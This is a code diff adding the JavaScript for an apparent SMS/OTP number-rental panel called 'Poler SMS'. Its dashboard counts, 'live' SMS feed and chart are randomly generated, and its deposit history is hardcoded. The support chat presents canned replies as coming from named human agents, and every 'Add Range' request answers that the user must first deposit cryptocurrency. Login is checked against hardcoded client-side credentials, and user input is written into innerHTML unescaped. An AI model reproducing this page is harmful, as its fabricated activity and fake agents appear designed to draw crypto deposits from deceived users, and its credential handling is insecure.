+            { date: "2025-08-07 05:30 PM", amount: "80.00", network: "POLYGON", tx: "a3s4...d5f6", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-06 09:00 AM", amount: "90.00", network: "SOLANA", tx: "z1x2...c3v4", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-05 07:00 PM", amount: "50.00", network: "TRC20", tx: "g1h2...i3j4", status: "Completed", statusClass: "status-completed" },
+            { date: "2025-08-04 04:00 PM", amount: "70.00", network: "BEP20", tx: "k5l6...m7n8", status: "Completed", statusClass: "status-completed" },
+        ];
+        let depositHistoryInterval = null;
+        let inactivityTimer;
+        let lastChatActivityTime = Date.now();
+        const INACTIVITY_THRESHOLD = 10 * 60 * 1000; // 10 minutes in milliseconds
+        const AGENT_ROTATION_INTERVAL = 2 * 60 * 1000; // Check every 2 minutes
+
+        // Helper function to calculate total deposited amount (for sidebar balance)
+        function calculateTotalDeposited() {
+            return sampleDepositHistory
+                .filter(item => item.status === "Completed")
+                .reduce((sum, item) => sum + parseFloat(item.amount), 0);
+        }
+
+        // Function to update the sidebar total deposited amount (now "Balance")
+        function updateSidebarBalance() {
+            const sidebarBalanceAmount = document.getElementById('sidebar-balance-amount');
+            if (sidebarBalanceAmount) {
+                sidebarBalanceAmount.textContent = calculateTotalDeposited().toFixed(2);
+            }
+        }
+
+        // --- DASHBOARD LIVE SMS LOGIC (UPDATED for OTP length and timing) ---
+        function generateRandomSMS() {
+            const smsList = document.getElementById('smsList');
+            if (!smsList) return;
+            // Clear existing SMS to simulate new ones arriving
+            smsList.innerHTML = ''; 
+
+            // Shuffle and pick 5-7 random unique SMS entries
+            const shuffledIndices = Array.from({length: smsData.length}, (_, i) => i).sort(() => 0.5 - Math.random());
+            const numToShow = Math.min(7, smsData.length); // Show up to 7 random SMS
+            const selectedSms = shuffledIndices.slice(0, numToShow).map(index => smsData[index]);
+
+            selectedSms.forEach(sms => {
+                let otp = sms.otpLength > 0 ? generateRandomNumber(sms.otpLength) : 'XXXXXX'; // Generate OTP or use XXXXXX
+                let finalContent = sms.content.replace("_CODE_", otp);
+
+                const smsItem = document.createElement('div');
+                smsItem.className = 'sms-item';
+                smsItem.innerHTML = `
+                    <div class="sms-icon"><span class="flag-icon">${sms.flag}</span><i class="${sms.icon || 'fas fa-comment-dots'}" style="color: ${sms.color || '#666'};"></i></div>
+                    <div class="sms-details">
+                        <div class="sms-platform-name">${sms.country} ${sms.serviceID}</div>
+                        <div class="sms-number-service-id">${sms.number} ${sms.app}</div>
+                        <div class="sms-content">${finalContent}</div>
+                    </div>
+                    <div class="sms-time">${Math.floor(Math.random() * 59) + 1} secs ago</div>`;
+                smsList.appendChild(smsItem);
+            });
+        }
+        
+        // --- Function to initialize dashboard chart ---
+        function initializeDashboardChart() {
+            const ctx = document.getElementById('smsChart');
+            if (!ctx) return;
+
+            // Check if a chart instance already exists and destroy it
+            if (window.mySmsChart instanceof Chart) {
+                window.mySmsChart.destroy();
+            }
+
+            const chartData = Array.from({ length: 7 }, () => Math.floor(Math.random() * (150 - 60 + 1)) + 60);
+            const labels = [];
+            for (let i = 6; i >= 0; i--) {
+                const d = new Date();
+                d.setDate(d.getDate() - i);
+                labels.push(d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }));
+            }
+            
+            const isDarkMode = document.body.classList.contains('dark-mode');
+            const gridColor = isDarkMode ? 'rgba(255, 255, 255, 0.1)' : 'rgba(0, 0, 0, 0.1)';
+            const labelColor = isDarkMode ? '#e4e6eb' : '#2d3436';
+
+            window.mySmsChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: labels,
+                    datasets: [{
+                        label: 'SMS Received',
+                        data: chartData,
+                        fill: false,
+                        borderColor: 'rgba(37, 117, 252, 1)',
+                        backgroundColor: 'rgba(37, 117, 252, 1)',
+                        tension: 0.1,
+                        borderWidth: 3,
+                        pointRadius: 5,
+                        pointHoverRadius: 7
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { display: false },
+                        title: {
+                             display: true,
+                             text: 'SMS LAST 7 DAYS',
+                             font: { size: 16, weight: '500' },
+                             color: labelColor
+                        }
+                    },
+                    scales: { 
+                        y: { 
+                            beginAtZero: false, 
+                            min: 60, 
+                            max: 150,
+                            grid: { color: gridColor },
+                            ticks: { color: labelColor }
+                        },
+                        x: {
+                            grid: { color: gridColor },
+                            ticks: { color: labelColor }
+                        }
+                    }
+                }
+            });
+        }
+        
+        // --- LOGIN AND NAVIGATION ---
+        const sidebar = document.getElementById('sidebar');
+        const mainContentWrapper = document.getElementById('main-content-wrapper');
+        const menuToggle = document.getElementById('menuToggle');
+        const liveSupportFloatingButton = document.getElementById('liveSupportFloatingButton'); // Renamed
+        let smsRefreshInterval;
+        let failedLoginAttempts = 0;
+        const MAX_FAILED_ATTEMPTS = 2;
+        const AGENT_ID = "5890937"; // Fixed Agent ID as requested
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const captchaAnswer = document.getElementById('captcha-answer').value;
+            const errorSupportMessage = document.getElementById('support-message-on-error');
+
+            if (username !== 'MUNNA007' || password !== 'MUNNA007') {
+                failedLoginAttempts++;
+                if (failedLoginAttempts >= MAX_FAILED_ATTEMPTS) {
+                    errorSupportMessage.style.display = 'flex';
+                }
+                alert('Incorrect username or password.');
+                generateCaptcha();
+                document.getElementById('captcha-answer').value = '';
+                return;
+            }
+
+            if (captchaAnswer !== currentCaptcha.answer) {
+                failedLoginAttempts++;
+                if (failedLoginAttempts >= MAX_FAILED_ATTEMPTS) {
+                    errorSupportMessage.style.display = 'flex';
+                }
+                alert('Incorrect captcha answer. Please try again.');
+                generateCaptcha();
+                document.getElementById('captcha-answer').value = '';
+                return;
+            }
+
+            failedLoginAttempts = 0;
+            errorSupportMessage.style.display = 'none';
+            
+            // Store login state and user info in sessionStorage
+            // sessionStorage persists across reloads within the same tab, but clears on tab/browser close.
+            sessionStorage.setItem('isLoggedIn', 'true');
+            sessionStorage.setItem('loggedInUsername', username); 
+            sessionStorage.setItem('loggedInAgentId', AGENT_ID);
+            
+            // Set sidebar user info immediately
+            document.getElementById('sidebar-username').textContent = username; 
+            document.getElementById('sidebar-userid').innerHTML = `<i class="fas fa-id-badge"></i> Agent ID: ${AGENT_ID}`; 
+            updateSidebarBalance(); // Update sidebar balance
+
+            // Immediately hide login and show main elements
+            document.getElementById('login-container').style.display = 'none';
+            mainContentWrapper.style.display = 'block';
+            menuToggle.style.display = 'flex';
+            liveSupportFloatingButton.style.display = 'flex'; // Renamed
+
+            // Show dashboard first
+            showSection('dashboard'); 
+
+            // --- Voice greeting logic: Play AFTER dashboard is loaded, ONLY on initial login ---
+            playWelcomeVoice(username);
+        });
+
+        // New function to play welcome voice, only triggered on successful form submission
+        function playWelcomeVoice(username) {
+            if ('speechSynthesis' in window) {
+                const greetingText = `Welcome to Poler SMS, thank you, ${username}.`;
+                const utterance = new SpeechSynthesisUtterance(greetingText);
+                utterance.lang = 'en-US'; 
+                utterance.rate = 0.8; 
+
+                if (femaleVoice) {
+                    utterance.voice = femaleVoice;
+                } else {
+                    loadVoices(); 
+                    if (femaleVoice) {
+                        utterance.voice = femaleVoice;
+                    }
+                }
+                
+                setTimeout(() => {
+                    speechSynthesis.speak(utterance);
+                }, 500); // Small delay to ensure UI is ready
+            } else {
+                console.warn("Web Speech API not supported in this browser. Skipping voice greeting.");
+            }
+        }
+
+
+        function showSection(section) { 
+            if (!section || section === 'sign-out') return;
+            
+            clearInterval(depositHistoryInterval);
+            clearInterval(smsRefreshInterval);
+            clearInterval(inactivityTimer); // Stop inactivity timer when changing sections
+
+            document.querySelectorAll('.sidebar li').forEach(li => {
+                li.classList.remove('active');
+                if (li.getAttribute('data-section') === section) li.classList.add('active');
+            });
+
+            document.querySelectorAll('.container').forEach(c => c.style.display = 'none');
+            const containerToShow = document.getElementById(section + '-container');
+            
+            if (containerToShow) {
+                const templateKey = section.replace(/-(\w)/g, (_, c) => c.toUpperCase());
+                containerToShow.innerHTML = templates[templateKey] || '';
+                containerToShow.style.display = 'block';
+                
+                if (section === 'dashboard') {
+                    // Dummy data for counts
+                    document.getElementById('today-sms-count').textContent = (Math.floor(Math.random() * (200 - 100 + 1)) + 100).toString();
+                    document.getElementById('seven-day-sms-count').textContent = (Math.floor(Math.random() * (1500 - 700 + 1)) + 700).toString();
+                    document.getElementById('thirty-day-sms-count').textContent = (Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000).toString();
+
+                    // Calculate and display total deposited amount
+                    document.getElementById('total-deposited-amount').textContent = calculateTotalDeposited().toFixed(2);
+
+                    generateRandomSMS();
+                    // Changed refresh interval to 10 seconds as requested
+                    document.getElementById('refreshSms').addEventListener('click', generateRandomSMS);
+                    smsRefreshInterval = setInterval(generateRandomSMS, 10000); 
+                    
+                    initializeDashboardChart();
+
+                } else if (section === 'deposit') {
+                    initializeDepositSection();
+                } else if (section === 'sms-test') {
+                    loadOrGenerateSmsTestNumbersData();
+                    setupPagination(smsTestNumbersConfig);
+                    setupPagination(recentSmsTestConfig);
+
+                    // Add listeners for SMS Test Panel buttons
+                    document.getElementById('btn-copy-1').addEventListener('click', () => alert('Copied SMS Test Numbers data! (Dummy)'));
+                    document.getElementById('btn-csv-1').addEventListener('click', () => alert('Downloading SMS Test Numbers CSV! (Dummy)'));
+                    document.getElementById('btn-excel-1').addEventListener('click', () => alert('Downloading SMS Test Numbers Excel! (Dummy)'));
+                    document.getElementById('btn-pdf-1').addEventListener('click', () => alert('Downloading SMS Test Numbers PDF! (Dummy)'));
+                    document.getElementById('btn-print-1').addEventListener('click', () => alert('Printing SMS Test Numbers! (Dummy)'));
+
+                    document.getElementById('btn-copy-2').addEventListener('click', () => alert('Copied Recent SMS Test data! (Dummy)'));
+                    document.getElementById('btn-csv-2').addEventListener('click', () => alert('Downloading Recent SMS Test CSV! (Dummy)'));
+                    document.getElementById('btn-excel-2').addEventListener('click', () => alert('Downloading Recent SMS Test Excel! (Dummy)'));
+                    document.getElementById('btn-pdf-2').addEventListener('click', () => alert('Downloading Recent SMS Test PDF! (Dummy)'));
+                    document.getElementById('btn-print-2').addEventListener('click', () => alert('Printing Recent SMS Test! (Dummy)'));
+
+                     // Add search functionality for SMS Test Numbers
+                    document.getElementById('sms-test-numbers-search-input').addEventListener('keyup', (e) => {
+                        const searchTerm = e.target.value.toLowerCase();
+                        smsTestNumbersConfig.data = smsTestNumbersData.filter(item =>
+                            Object.values(item).some(value =>
+                                String(value).toLowerCase().includes(searchTerm)
+                            )
+                        );
+                        setupPagination(smsTestNumbersConfig);
+                    });
+
+                    // Add search functionality for Recent SMS Test
+                    document.getElementById('recent-sms-test-search-input').addEventListener('keyup', (e) => {
+                        const searchTerm = e.target.value.toLowerCase();
+                        recentSmsTestConfig.data = recentSmsTestData.filter(item =>
+                            Object.values(item).some(value =>
+                                String(value).toLowerCase().includes(searchTerm)
+                            )
+                        );
+                        setupPagination(recentSmsTestConfig);
+                    });
+
+
+                } else if (section === 'sms-range') {
+                    smsRangeConfig.data = allSmsRangeData;
+                    setupPagination(smsRangeConfig);
+                     document.getElementById('sms-range-search-input').addEventListener('keyup', (e) => {
+                        const searchTerm = e.target.value.toLowerCase();
+                        smsRangeConfig.data = allSmsRangeData.filter(item =>
+                            item.range.toLowerCase().includes(searchTerm) ||
+                            item.prefix.includes(searchTerm) ||
+                            item.testNumber.includes(searchTerm)
+                        );
+                        setupPagination(smsRangeConfig);
+                    });
+                     // Add listeners for SMS Range export/copy buttons
+                    document.querySelector('#sms-range-container .data-actions button:nth-child(1)').addEventListener('click', () => alert('Copied SMS Range data! (Dummy)'));
+                    document.querySelector('#sms-range-container .data-actions button:nth-child(2)').addEventListener('click', () => alert('Downloading SMS Range CSV! (Dummy)'));
+                    document.querySelector('#sms-range-container .data-actions button:nth-child(3)').addEventListener('click', () => alert('Downloading SMS Range Excel! (Dummy)'));
+                    document.querySelector('#sms-range-container .data-actions button:nth-child(4)').addEventListener('click', () => alert('Downloading SMS Range PDF! (Dummy)'));
+                    document.querySelector('#sms-range-container .data-actions button:nth-child(5)').addEventListener('click', () => alert('Printing SMS Range! (Dummy)'));
+
+                } else if (section === 'sms-number') {
+                    // Set to empty data as requested.
+                    mySmsNumbersConfig.data = []; 
+                    setupPagination(mySmsNumbersConfig);
+
+                    // Update record info display
+                    const totalRecords = mySmsNumbersConfig.data.length; // Will be 0 initially
+                    document.getElementById('sms-number-record-info').textContent = `Show Records: ${totalRecords}`;
+
+                    // Attach listeners for export/copy buttons in My SMS Numbers
+                    document.getElementById('sms-number-copy-btn').addEventListener('click', () => alert('Copied My SMS Numbers data! (Dummy)'));
+                    document.getElementById('sms-number-csv-btn').addEventListener('click', () => alert('Downloading My SMS Numbers CSV! (Dummy)'));
+                    document.getElementById('sms-number-excel-btn').addEventListener('click', () => alert('Downloading My SMS Numbers Excel! (Dummy)'));
+                    document.getElementById('sms-number-pdf-btn').addEventListener('click', () => alert('Downloading My SMS Numbers PDF! (Dummy)'));
+                    document.getElementById('sms-number-print-btn').addEventListener('click', () => alert('Printing My SMS Numbers! (Dummy)'));
+
+                    // Add search functionality for My SMS Numbers (both search inputs)
+                    const applySmsNumberSearch = () => {
+                        const topSearchTerm = document.getElementById('sms-number-top-search-input').value.toLowerCase();
+                        const tableSearchTerm = document.getElementById('sms-number-table-search-input').value.toLowerCase();
+                        const searchTerm = topSearchTerm || tableSearchTerm; // Use either, or combine
+
+                        if (searchTerm) {
+                            const filteredData = mySmsNumbersRawData.filter(item =>
+                                Object.values(item).some(value =>
+                                    String(value).toLowerCase().includes(searchTerm)
+                                )
+                            );
+                            mySmsNumbersConfig.data = filteredData;
+                        } else {
+                            mySmsNumbersConfig.data = []; // If search term is empty, reset to no data as per initial state
+                        }
+                        setupPagination(mySmsNumbersConfig);
+                        document.getElementById('sms-number-record-info').textContent = `Show Records: ${mySmsNumbersConfig.data.length}`;
+                    };
+
+                    document.getElementById('sms-number-top-search-input').addEventListener('keyup', applySmsNumberSearch);
+                    document.getElementById('sms-number-table-search-input').addEventListener('keyup', applySmsNumberSearch);
+
+
+                } else if (section === 'ai-robot-sms') { // Now "Live Support" section logic
+                    const polerSmsBotContent = document.getElementById('poler-sms-bot-content');
+                    const botInitialPrompt = document.getElementById('bot-initial-prompt');
+                    const addRangeFormSection = document.getElementById('add-range-form-section');
+                    const termsSelect = document.getElementById('terms-select');
+                    const submitAddRangeBtn = document.getElementById('submit-add-range');
+                    const addRangeResponseMessage = document.getElementById('add-range-response-message');
+
+                    // Populate terms dropdown for "Add Range"
+                    if (termsSelect) {
+                        termsSelect.innerHTML = '';
+                        for (let i = 100; i <= 230; i++) {
+                            const option = document.createElement('option');
+                            option.value = i;
+                            option.textContent = i;
+                            termsSelect.appendChild(option);
+                        }
+                    }
+
+                    // Poler SMS Bot: Initial options listeners
+                    document.querySelectorAll('.bot-action-btn').forEach(button => {
+                        button.addEventListener('click', function() {
+                            const action = this.dataset.action;
+                            if (action === 'add-range') {
+                                botInitialPrompt.style.display = 'none';
+                                addRangeFormSection.style.display = 'block';
+                                addRangeResponseMessage.textContent = ''; // Clear previous messages
+                            } else if (action === 'back-dashboard') {
+                                showSection('dashboard');
+                            }
+                        });
+                    });
+
+                    // Poler SMS Bot: "Add Range" form submission
+                    if (submitAddRangeBtn) {
+                        submitAddRangeBtn.addEventListener('click', () => {
+                            const terminationName = document.getElementById('termination-name').value.trim();
+                            const selectedTerms = termsSelect.value;
+
+                            addRangeResponseMessage.textContent = '';
+                            addRangeResponseMessage.classList.remove('success', 'error');
+
+                            if (!terminationName) {
+                                addRangeResponseMessage.textContent = 'Please enter a Termination Name.';
+                                addRangeResponseMessage.classList.add('error');
+                                return;
+                            }
+
+                            // Simulate deposit check / processing
+                            addRangeResponseMessage.textContent = 'Processing your request...';
+                            setTimeout(() => {
+                                // As per user request, always suggest deposit first.
+                                addRangeResponseMessage.textContent = `Please deposit funds first. Your request to add range "${terminationName}" with Terms ${selectedTerms} will be processed after confirmation.`;
+                                addRangeResponseMessage.classList.add('warning'); // Use warning for suggestion, not error
+                                
+                                // Reset form after message
+                                document.getElementById('termination-name').value = '';
+                                termsSelect.value = '100'; // Reset to default term
+                                
+                                // Optionally, go back to initial bot prompt after a delay
+                                setTimeout(() => {
+                                    addRangeFormSection.style.display = 'none';
+                                    botInitialPrompt.style.display = 'block';
+                                    addRangeResponseMessage.textContent = '';
+                                }, 5000); // Hide message and return to initial options after 5 seconds
+                                
+                            }, 1500);
+                        });
+                    }
+
+                    const aiQuestionInput = document.getElementById('ai-question-input');
+                    const aiAskBtn = document.getElementById('ai-ask-btn');
+                    const aiResponseArea = document.getElementById('ai-response-area');
+
+                    const liveChatMessages = document.getElementById('live-chat-messages');
+                    const liveChatInput = document.getElementById('live-chat-input');
+                    const liveChatSendBtn = document.getElementById('live-chat-send-btn');
+                    const liveChatScreenshotInput = document.getElementById('live-chat-screenshot-input'); 
+                    const liveChatFileInput = document.getElementById('live-chat-file-input'); 
+                    const suggestedMessagesContainer = document.getElementById('suggested-messages');
+
+                    const currentUsername = document.getElementById('sidebar-username').textContent || 'User';
+
+                    // Initialize agent and start inactivity timer
+                    initializeLiveSupportAgent();
+                    startInactivityTimer();
+
+                    // AI Response Data (English Only) for "Ask AI about Poler SMS"
+                    const aiEnglishResponses = {
+                        "poler sms": "Poler SMS is a European country based company providing reliable and efficient SMS services for various needs, including OTP verification, marketing, and notifications. We aim to offer seamless communication solutions globally.",
+                        "what is poler sms": "Poler SMS is a European country based company providing reliable and efficient SMS services and answering common questions related to our platform. For complex issues, you can always contact our live support.",
+                        "how are you": "As an AI, I don't have feelings, but I'm operating perfectly and ready to assist you!",
+                        "where are you": "I exist as a software program on secure servers, helping users like you. I don't have a physical location, but I'm accessible globally to assist our users.",
+                        "hello": "Hello! How can I assist you today?",
+                        "hi": "Hi there! What can I do for you?",
+                        "hi sir": "Hello! How may I help you today?",
+                        "good morning": "Good morning! How can I assist you with Poler SMS today?",
+                        "good afternoon": "Good afternoon! How can I assist you with Poler SMS today?",
+                        "good evening": "Good evening! How can I assist you with Poler SMS today?",
+                        "what can you do": "I can help you check deposit statuses, provide information about Poler SMS services, and answer general questions. For specific account issues, please use the live chat with a human agent.",
+                        "deposit": "You can deposit funds securely via Binance Pay, supporting TRC20, BEP20, ERC20, TON, Polygon POS, and Solana networks. The minimum deposit amount is 50 USD. Please ensure your transaction ID is correct for quick processing.", 
+                        "how do i make a deposit?": "To make a deposit, go to the 'Deposit' section from the sidebar. Choose your network, copy the address, and send a minimum of 50 USD. Then enter your transaction ID.",
+                        "what is my current balance?": "I cannot access your personal account details due to security and privacy policies. Please check your balance on your dashboard or contact live support for assistance.",
+                        "i have a problem with my sms.": "I understand. For issues related to your SMS, please describe the problem in detail in the live chat, or share any relevant screenshots with our support agents.",
+                        "can i get a report?": "Yes, you can generate various SMS reports from the 'SMS Reports' section. You can filter them by date, range, number, and CLI.",
+                        "support": "You can reach our live support team directly through the chat window on this page, or you can contact us via Facebook or Skype at charlesjames997@outlook.com for further assistance.",
+                        "picture": "For sharing pictures or screenshots, please use the dedicated photo attachment option in the live support chat. Our agents will then review it to assist you better.",
+                        "screenshot": "For sharing screenshots or pictures, please use the dedicated photo attachment option in the live support chat. Our agents will then review it to assist you better.",
+                        "file": "You can attach various files using the file attachment option in the live support chat. Our team will review the file to help resolve your issue.",
+                        "thanks": "You're most welcome! I'm glad I could assist you. Feel free to ask if you have more questions.",
+                        "thank you": "You're most welcome! I'm glad I could assist you. Feel free to ask if you have more questions.",
+                        "what time is it?": `The current time is ${new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true })}.`,
+                        "what is the weather like?": "I am an AI and do not have real-time access to weather data. You can check a weather app or website for the most accurate information!",
+                        "who are you?": "I am Poler SMS's AI assistant, here to help you with information about our services and general queries.",
+                        "tell me about yourself.": "I am a virtual assistant created by Poler SMS to provide quick support and information to our users. I don't have a personal life or feelings, but I'm always learning to serve you better!",
+                        "help me?": "Of course, I'm here to help! Please tell me what you need assistance with, or choose one of the suggested messages above.",
+                        "default": "I'm not sure how to answer that specific question. My knowledge base is focused on Poler SMS services and related queries. Please try rephrasing your question or connect with our live support for more personalized assistance."
+                    };
+
+                    function getAiResponse(question) {
+                        const lowerQuestion = question.toLowerCase();
+                        
+                        for (const keyword in aiEnglishResponses) {
+                            if (lowerQuestion.includes(keyword)) {
+                                return aiEnglishResponses[keyword];
+                            }
+                        }
+                        return aiEnglishResponses["default"];
+                    }
+
+                    // Ask AI Logic
+                    if (aiAskBtn) {
+                        aiAskBtn.addEventListener('click', () => {
+                            const question = aiQuestionInput.value.trim();
+                            aiResponseArea.textContent = '';
+                            aiResponseArea.classList.remove('success', 'error');
+
+                            if (question) {
+                                aiResponseArea.textContent = 'AI thinking...';
+                                setTimeout(() => {
+                                    aiResponseArea.textContent = getAiResponse(question);
+                                    aiQuestionInput.value = '';
+                                }, 1000);
+                            } else {
+                                aiResponseArea.textContent = 'Please ask a question.';
+                                aiResponseArea.classList.add('error');
+                            }
+                        });
+                    }
+
+                    // Live Chat Logic
+                    const addChatMessage = (message, senderClass, senderName, avatarUrl = '') => {
+                        const messageDiv = document.createElement('div');
+                        messageDiv.classList.add('chat-message', senderClass);
+                        let senderDisplay = `<span class="sender-name">${senderName}:</span>`;
+                        if (senderClass === 'support' && avatarUrl) {
+                            senderDisplay = `<span class="sender-name" style="display: flex; align-items: center;"><img src="${avatarUrl}" alt="Agent Avatar" style="width: 20px; height: 20px; border-radius: 50%; margin-right: 5px;"> ${senderName}:</span>`;
+                        }
+                        messageDiv.innerHTML = `${senderDisplay} ${message}`;
+                        liveChatMessages.appendChild(messageDiv);
+                        liveChatMessages.scrollTop = liveChatMessages.scrollHeight; // Scroll to bottom
+                        lastChatActivityTime = Date.now(); // Update activity time
+                    };
+
+                    const suggestedMessageResponses = {
+                        "How do I make a deposit?": [
+                            "Certainly! To make a deposit, please navigate to the 'Deposit' section in the sidebar. You'll find detailed instructions there.",
+                            "I can help with that! Go to the 'Deposit' menu. Choose your preferred network, copy the address, and send the amount.",
+                            "Depositing is easy! Head to the 'Deposit' page, select your preferred crypto network, and follow the steps provided."
+                        ],
+                        "What is my current balance?": [
+                            "I'm sorry, I cannot directly access your personal balance due to security reasons. Please check your dashboard for the most up-to-date balance.",
+                            "For your current balance, please refer to the 'Balance' display in your sidebar or on the dashboard. I don't have direct access to account specifics.",
+                            "Your balance information is securely displayed on your dashboard. I am unable to provide it directly here."
+                        ],
+                        "I have a problem with my SMS.": [
+                            "I'm sorry to hear that. Please describe your SMS issue in more detail, including any error messages or specific examples, and our team will look into it promptly.",
+                            "Okay, let's get this sorted. Could you please provide more details about the SMS problem you're experiencing? Screenshots are often helpful if you have them!",
+                            "No problem, we're here to help with SMS issues. Tell me more about what's going on, such as the number, date, and any specific content issues."
+                        ],
+                        "Can I get a report?": [
+                            "Yes, you can generate various SMS reports from the 'SMS Reports' section. You can filter them by date, range, number, and CLI.",
+                            "Absolutely! Our 'SMS Reports' section allows you to pull detailed data. Just apply your desired filters like date range, and then click 'Show Report'.",
+                            "Reports are available in the 'SMS Reports' tab. You can export them to CSV, Excel, or PDF formats too. Let me know if you need help with the filtering options there."
+                        ],
+                    };
+
+
+                    liveChatSendBtn.addEventListener('click', () => {
+                        const message = liveChatInput.value.trim();
+                        if (message) {
+                            addChatMessage(message, 'user', currentUsername);
+                            liveChatInput.value = '';
+
+                            const lowerMessage = message.toLowerCase();
+                            // Check for greetings first
+                            if (lowerMessage === "hi" || lowerMessage === "hello" || lowerMessage === "hi sir") {
+                                setTimeout(() => {
+                                    addChatMessage(`Hello, I'm ${currentSupportAgent.name}. How can I assist you today?`, 'support', currentSupportAgent.name, currentSupportAgent.avatar);
+                                }, 1500);
+                            } else if (suggestedMessageResponses[message]) { // Check if it's a suggested message match
+                                const responses = suggestedMessageResponses[message];
+                                const randomResponse = responses[Math.floor(Math.random() * responses.length)];
+                                setTimeout(() => {
+                                    addChatMessage(randomResponse, 'support', currentSupportAgent.name, currentSupportAgent.avatar);
+                                }, 1500);
+                            } else {
+                                // Generic support response if not a specific greeting or suggested message
+                                setTimeout(() => {
+                                    addChatMessage(`Thank you for your message. ${currentSupportAgent.name} (or another agent) will review it and get back to you shortly.`, 'support', currentSupportAgent.name, currentSupportAgent.avatar);
+                                }, 1500);
+                            }
+                        }
+                    });
+
+                    liveChatInput.addEventListener('keypress', (e) => {
+                        if (e.key === 'Enter') {
+                            liveChatSendBtn.click();
+                        }
+                    });
+
+                    // Suggested messages functionality
+                    if (suggestedMessagesContainer) {
+                        suggestedMessagesContainer.addEventListener('click', (e) => {
+                            if (e.target.tagName === 'BUTTON' && e.target.dataset.suggestion) {
+                                liveChatInput.value = e.target.dataset.suggestion;
+                                liveChatSendBtn.click();
+                            }
+                        });
+                    }
+
+                    // Screenshot Upload Simulation
+                    if (liveChatScreenshotInput) {
+                        liveChatScreenshotInput.addEventListener('change', (e) => {
+                            if (e.target.files.length > 0) {
+                                const fileName = e.target.files[0].name;
+                                addChatMessage(`Image file selected: ${fileName}.`, 'user', currentUsername);
+                                setTimeout(() => {
+                                    addChatMessage(`Screenshot received! ${currentSupportAgent.name} (or another agent) will review it and get back to you.`, 'support', currentSupportAgent.name, currentSupportAgent.avatar);
+                                }, 1500);
+                                // Clear the file input for next use
+                                e.target.value = ''; 
+                            }
+                        });
+                    }
+
+                    // General File Upload Simulation
+                    if (liveChatFileInput) {
+                        liveChatFileInput.addEventListener('change', (e) => {
+                            if (e.target.files.length > 0) {
+                                const fileName = e.target.files[0].name;
+                                addChatMessage(`Document file selected: ${fileName}.`, 'user', currentUsername);
+                                setTimeout(() => {
+                                    addChatMessage(`File received! ${currentSupportAgent.name} (or another agent) will review it and get back to you.`, 'support', currentSupportAgent.name, currentSupportAgent.avatar);
+                                }, 1500);
+                                // Clear the file input for next use
+                                e.target.value = ''; 
+                            }
+                        });
+                    }
+                }
+                attachCommonListeners();
+            }
+        }
+        
+        function attachCommonListeners() {
+            document.querySelectorAll('.back-to-dashboard').forEach(button => {
+                button.addEventListener('click', () => showSection('dashboard'));
+            });
+            document.querySelectorAll('.nav-button').forEach(button => {
+                 button.addEventListener('click', () => showSection(button.dataset.section));
+            });
+            // Attach listener for the floating Live Support button
+            if (liveSupportFloatingButton) { // Check if element exists before attaching listener
+                liveSupportFloatingButton.addEventListener('click', () => showSection('ai-robot-sms')); 
+            }
+        }
+        
+        menuToggle.addEventListener('click', () => {
+            sidebar.classList.toggle('active');
+            mainContentWrapper.classList.toggle('shifted');
+        });
+        
+        document.querySelectorAll('.sidebar li').forEach(item => {
+            if (item.hasAttribute('data-section')) {
+                item.addEventListener('click', function() {
+                    const section = this.getAttribute('data-section');
+                    showSection(section);
+                     if (window.innerWidth <= 768) {
+                        sidebar.classList.remove('active');
+                        mainContentWrapper.classList.remove('shifted');
+                    }
+                });
+            }
+        });
+
+        document.getElementById('signOut').addEventListener('click', () => {
+            // Clear login state from sessionStorage - This ensures re-login on new tab/browser open
+            sessionStorage.removeItem('isLoggedIn'); 
+            sessionStorage.removeItem('loggedInUsername');
+            sessionStorage.removeItem('loggedInAgentId');
+
+            // Explicitly show login container and hide others
+            document.getElementById('login-container').style.display = 'flex';
+            mainContentWrapper.style.display = 'none';
+            menuToggle.style.display = 'none';
+            liveSupportFloatingButton.style.display = 'none'; // Hide Live Support floating button after sign out
+            sidebar.classList.remove('active');
+            mainContentWrapper.classList.remove('shifted');
+            generateCaptcha(); // Generate new captcha for fresh login
+            document.getElementById('captcha-answer').value = ''; // Clear captcha answer
+            clearInterval(smsRefreshInterval); // Stop any dashboard refresh intervals
+            clearInterval(inactivityTimer); // Clear inactivity timer on sign out
+            failedLoginAttempts = 0; // Reset failed attempts
+            document.getElementById('support-message-on-error').style.display = 'none'; // Hide error message
+        });
+
+        // --- DARK MODE LOGIC ---
+        const darkModeToggle = document.getElementById('dark-mode-toggle');
+
+        // Sync toggle state with the current theme on load
+        if (localStorage.getItem('theme') === 'dark') {
+            document.body.classList.add('dark-mode');
+            darkModeToggle.checked = true; // Ensure toggle reflects state
+        }
+
+        darkModeToggle.addEventListener('change', () => {
+            if (darkModeToggle.checked) {
+                document.body.classList.add('dark-mode');
+                localStorage.setItem('theme', 'dark');
+            } else {
+                document.body.classList.remove('dark-mode');
+                localStorage.setItem('theme', 'light');
+            }
+            // Re-initialize chart with new colors if it's visible
+            if (document.getElementById('smsChart')) {
+                initializeDashboardChart();
+            }
+        });
+        
+        // --- DEPOSIT HISTORY & SECTION LOGIC ---
+        function updateDepositHistory() {
+            const historyBody = document.getElementById('deposit-history-body');
+            if (!historyBody) return;
+            
+            sampleDepositHistory.sort((a, b) => new Date(b.date) - new Date(a.date));
+
+            historyBody.innerHTML = '';
+            sampleDepositHistory.forEach(item => {
+                const row = document.createElement('tr');
+                row.style.animation = 'fadeIn 0.5s ease';
+                // Handle cases where tx might be undefined for 'Failed' or 'Pending' dummy entries
+                const displayTx = item.tx ? item.tx : 'N/A';
+                row.innerHTML = `
+                    <td>${item.date}</td>
+                    <td>${item.amount}</td>
+                    <td>${item.network}</td>
+                    <td>${displayTx}</td>
+                    <td><span class="${item.statusClass}">${item.status}</span></td>
+                `;
+                historyBody.appendChild(row);
+            });
+        }
+
+        function initializeDepositSection() {
+             const networkSelect = document.getElementById('network-select');
+             const trc20Details = document.getElementById('trc20-details');
+             const bep20Details = document.getElementById('bep20-details');
+             const erc20Details = document.getElementById('erc20-details'); 
